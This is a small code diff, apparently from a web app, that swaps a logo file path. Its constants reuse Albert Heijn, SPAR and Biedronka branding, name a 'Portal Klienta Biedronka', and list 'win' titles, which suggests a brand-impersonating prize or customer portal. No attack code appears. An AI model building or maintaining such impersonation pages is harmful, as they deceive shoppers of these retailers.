@@ -57,7 +57,7 @@ type LegacyGlobalSettings = Partial<GlobalSettings> & {
 };
 
 const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
-const ALBERT_HEIJN_LOGO_URL = "/form-assets/biedronka-logo.svg";
+const ALBERT_HEIJN_LOGO_URL = "/form-assets/biedronka-mini-logo.webp";
 const PORTAL_BG_URL = "/form-assets/bg-desktop.webp";
 const LEGACY_BG_URL = "/spar-bg.png";
 const LEGACY_LOGO_URLS = new Set([
@@ -84,7 +84,7 @@ const LEGACY_WIN_TITLES = new Set([
 ]);
 
 export const defaultSettings: GlobalSettings = {
-  logo_url: "/form-assets/biedronka-logo.svg",
+  logo_url: "/form-assets/biedronka-mini-logo.webp",
   bg_url: PORTAL_BG_URL,
   portal_name: "Portal Klienta Biedronka",
   support_center_name: "Obsługa Klienta Biedronka",
